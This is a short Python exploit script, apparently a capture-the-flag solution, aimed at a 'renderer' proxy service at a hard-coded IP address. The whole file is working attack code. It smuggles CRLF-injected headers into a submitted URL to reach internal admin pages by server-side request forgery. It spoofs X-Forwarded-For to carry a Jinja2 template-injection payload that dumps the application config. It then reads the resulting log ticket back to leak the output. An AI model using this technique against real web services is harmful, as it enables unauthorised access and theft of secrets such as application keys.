#!/usr/bin/python3

import urllib.parse
import urllib.request
import urllib.error


_URL = 'http://110.10.147.169/renderer/'
#_URL = 'http://127.0.0.123/renderer/'

_HDRS = ''.join((
    ' HTTP/1.1\r\n',
    'X-Forwarded-For: %s\r\n',
    'Accept-Encoding: identity\r\n',
    'Host: 127.0.0.1\r\n',
    'Connection: close\r\n',
    'User-Agent: AdminBrowser/1.337\r\n',
    '\r\n',
    '\r\n',
    'grbg',
))

_INJ = '''
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
'''.replace('\n', ' ')


def _post(data_url):
    data = {
        'url': data_url,
    }
    data = urllib.parse.urlencode(data).encode()
    request = urllib.request.Request(_URL, data)
    try:
        response = urllib.request.urlopen(request)
    except urllib.error.HTTPError as exc:
        response = exc

    return response


def _try(data_url, ip='127.0.0.1'):
    data_url = data_url + _HDRS % (ip, )
    print('url:', data_url)
    response = _post(data_url)

    print('code:', response.code)
    contents = response.read().decode('utf-8').split('\n')

    proxied = None
    for line in contents:
        if proxied is None:
            if '<div class="proxy-body">' in line:
                proxied = []
        else:
            if '</div>' in line:
                break
            proxied.append(line)
    if proxied is None:
        proxied = contents

    proxied = '\n'.join('    |' + line for line in proxied)
    print('contents:')
    print(proxied)
    print()

    return proxied


def _create_ticket():
    contents = _try('http://127.0.0.1/renderer/admin', _INJ)
    for line in contents.split('\n'):
        if 'Your access log is written with ticket no' in line:
            return line.split()[-1]
    assert False


def _read_ticket(id):
    _try(f'http://127.0.0.1/renderer/admin/ticket?ticket={id}')


def _do():
    #_try(_URL)
    #_try('http://127.0.0.1/renderer/whatismyip')
    #_try('http://127.0.0.1/renderer/admin')
    #_try('http://127.0.0.1/renderer/admin/ticket')

    tid = _create_ticket()
    print('Ticket id:', tid)
    _read_ticket(tid)


_do()
